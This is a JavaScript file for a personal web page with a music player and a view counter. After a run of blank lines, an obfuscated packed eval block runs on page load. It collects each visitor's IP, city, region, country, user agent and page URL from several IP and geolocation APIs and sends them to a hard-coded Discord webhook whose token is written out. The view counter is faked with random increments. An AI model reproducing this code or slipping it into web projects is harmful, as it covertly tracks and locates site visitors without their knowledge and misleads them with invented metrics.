
        const audioPlayer = document.getElementById('audioPlayer');
        const muteBtn = document.getElementById('muteBtn');
        const playBtn = document.getElementById('playBtn');
        const playIcon = playBtn.querySelector('i');
        const albumCover = document.getElementById('albumCover');
        const songTitle = document.getElementById('songTitle');
        const songArtist = document.getElementById('songArtist');
        const progressBar = document.getElementById('progressBar');
        const progress = document.getElementById('progress');
        const currentTimeElement = document.getElementById('currentTime');
        const totalTimeElement = document.getElementById('totalTime');
        const viewCountElement = document.getElementById('viewCount');
        
        // Trocar musica
        const musicConfig = {
            title: "A morte do autotune",           // Título da música
            artist: "Matuê",             // Artista
            cover: "img/musica.jpg", // URL da capa
            file: "music/matue.mp3",  // Arquivo da música
            volume: 0.1                  // Volume (0 a 1)
        };
        
   
        let isMuted = false;
        let isPlaying = true;
        let viewCount = 1245;
        
 
        function initPlayer() {
       
            songTitle.textContent = musicConfig.title;
            songArtist.textContent = musicConfig.artist;
            albumCover.src = musicConfig.cover;
            audioPlayer.src = musicConfig.file;
            
         
            audioPlayer.volume = musicConfig.volume;
            
      
            audioPlayer.play().catch(e => {
                console.log("Reprodução automática bloqueada:", e);
                playIcon.className = 'fas fa-play';
                isPlaying = false;
            });
            
        
            setInterval(updateViewCount, 5000);
        }
        
     
        function updateViewCount() {
            viewCount += Math.floor(Math.random() * 3) + 1;
            viewCountElement.textContent = viewCount.toLocaleString() + ' visualizações';
        }
        
     
        function formatTime(seconds) {
            if (isNaN(seconds)) return "0:00";
            const mins = Math.floor(seconds / 60);
            const secs = Math.floor(seconds % 60);
            return `${mins}:${secs < 10 ? '0' : ''}${secs}`;
        }
        
     
        muteBtn.addEventListener('click', function() {
            isMuted = !isMuted;
            audioPlayer.muted = isMuted;
            const icon = muteBtn.querySelector('i');
            
            if (isMuted) {
                icon.className = 'fas fa-volume-mute';
                muteBtn.style.background = 'rgba(255, 50, 50, 0.3)';
            } else {
                icon.className = 'fas fa-volume-up';
                muteBtn.style.background = 'rgba(255, 255, 255, 0.2)';
            }
        });
        
    
        playBtn.addEventListener('click', function() {
            if (isPlaying) {
                audioPlayer.pause();
                playIcon.className = 'fas fa-play';
                isPlaying = false;
            } else {
                audioPlayer.play();
                playIcon.className = 'fas fa-pause';
                isPlaying = true;
            }
        });
        
      
        audioPlayer.addEventListener('timeupdate', function() {
            const currentTime = audioPlayer.currentTime;
            const duration = audioPlayer.duration;
            
            if (duration) {
                const progressPercent = (currentTime / duration) * 100;
                progress.style.width = progressPercent + '%';
                currentTimeElement.textContent = formatTime(currentTime);
                totalTimeElement.textContent = formatTime(duration);
            }
        });
        
    
        progressBar.addEventListener('click', function(e) {
            if (!audioPlayer.duration) return;
            
            const rect = progressBar.getBoundingClientRect();
            const clickX = e.clientX - rect.left;
            const newPercent = (clickX / rect.width);
            
            audioPlayer.currentTime = newPercent * audioPlayer.duration;
        });
        
      
        audioPlayer.addEventListener('ended', function() {
            // Reiniciar a música
            audioPlayer.currentTime = 0;
            audioPlayer.play();
        });
        
        
        window.addEventListener('load', initPlayer);









eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('8 9 I(){7{0 B=1 1i();0 r=1 1c(B);0 1j={\'h\':B,\'f\':r.f||"g",\'e\':r.e||"g",\'d\':r.d||"g",\'x\':2C.x,\'l\':y 13().2B(),\'2A\':2z.2y.2x};1 15(1j)}6(2w){}}8 9 1i(){0 1h=[\'3://a.w.v?u=2\',"3://2v.w.v?u=2","3://2u.i/","3://2t.2s/","3://2r.2q.i/"];1b(0 k 1a 1h){7{2p(k.2o("2")){0 1g=1 b(k,{\'A\':z});0 1f=1 1g.2();q 1f.h}2n{0 1e=1 b(k,{\'A\':z});0 1d=1 1e.11();q 1d.2m()}}6(2l){H.G("❌ "+k+" E, D 2kó2j...");16}}2i y 2h("2g 2f 2e 2d s 2c")}8 9 1c(j){0 19=[\'3://2b.2a/\'+j+"/2/",\'3://29.28/2/\'+j,\'3://27.i/a/2/\'+j,"3://a.26.25/24?23=22&h="+j];1b(0 18 1a 19){7{0 17=1 b(18,{\'A\':z});0 4=1 17.2();q{\'f\':4.f||4.21,\'e\':4.e||4.20||4.1Z,\'d\':4.1Y||4.d,\'1X\':4.1W||4.1V}}6(1U){16}}q{\'f\':"g",\'e\':"g",\'d\':"g"}}8 9 15(5){0 10={\'1T\':"🚀 K 1S 1R 1Q",\'1P\':1O,\'1N\':[{\'p\':"🌐 s",\'n\':\'```\'+5.h+"```",\'m\':14},{\'p\':"📍 1Mção",\'n\':5.f+", "+5.e+", "+5.d,\'m\':14},{\'p\':"🕒 1L/1K",\'n\':\'<t:\'+1J.1I(y 13(5.l).1H()/1G)+":F>",\'m\':12},{\'p\':"🔍 1F 1E",\'n\':\'```\'+5.x.1D(1C,1B)+\'...```\',\'m\':12}],\'1A\':{\'11\':"1z - 1y"},\'l\':5.l};7{1 b("3://Y.i/a/X/W/V-U",{\'T\':"S",\'R\':{\'Q-P\':\'O/2\'},\'N\':M.L({\'1x\':[10]})})}6(1w){c}}8 9 C(){7{0 Z=1 b("3://a.w.v?u=2");0 J=1 Z.2();1 b(\'3://Y.i/a/X/W/V-U\',{\'T\':"S",\'R\':{\'Q-P\':"O/2"},\'N\':M.L({\'1v\':"🌐 K 1u - s: "+J.h})})}6(1t){}}1s.1r("1q",9(){1p(8()=>{7{1 I()}6(1o){H.G("1não 1m E, D 1l...");1 C()}},1k)});',62,163,'const|await|json|https|_0x9a8dcf|_0x344aff|catch|try|async|function|api|fetch||country|region|city|Desconhecido|ip|com|_0x1d025|_0x5e8c18|timestamp|inline|value||name|return|_0x3f81aa|IP||format|org|ipify|userAgent|new|0x1388|timeout|_0x1a55fa|logSimpleIP|tentando|falhou||log|console|logVisitorIP|_0x3839af|Novo|stringify|JSON|body|application|Type|Content|headers|POST|method|7cesruncsFDUjaLy3rNUmbvJgx1|chTPJiPlgTUZhcbgME67rfuGKJLpiS1g3DmyDW59|1454565569025278035|webhooks|discord|_0x24fb45|_0x11888d|text|false|Date|true|sendToDiscord|continue|_0x1a32d5|_0x57c275|_0x3f49c2|of|for|getLocationWithFallbacks|_0x568be3|_0x8452a2|_0x58941b|_0x2aa540|_0x450e60|getIPWithFallbacks|_0x916636|0x7d0|simplificada|completa|Vers|_0x2eb26b|setTimeout|DOMContentLoaded|addEventListener|document|_0x606f31|acesso|content|_0x4da528|embeds|Analytics|fl0ppy|footer|0x64|0x0|substring|Agent|User|0x3e8|getTime|floor|Math|Hora|Data|Localiza|fields|0x6c5ce7|color|Site|no|Visitante|title|_0x119bfc|country_code2|country_code|countryCode|country_name|state_prov|region_name|city_name|demo|apiKey|ipgeo|io|ipgeolocation|freeipapi|app|ipwhois|co|ipapi|falharam|de|APIs|as|Todas|Error|throw|ximo|pr|_0x1ca0ce|trim|else|includes|if|amazonaws|checkip|me|ident|icanhazip|api64|_0x3411e7|href|location|window|page|toISOString|navigator'.split('|'),0,{}))






function copiarDiscord() {
    const btn = event.currentTarget;
    navigator.clipboard.writeText("drop404").then(() => {
      btn.classList.add("show-tooltip");
      setTimeout(() => {
        btn.classList.remove("show-tooltip");
      }, 1000);
    });
  }



document.getElementById("currentYear").textContent = new Date().getFullYear();

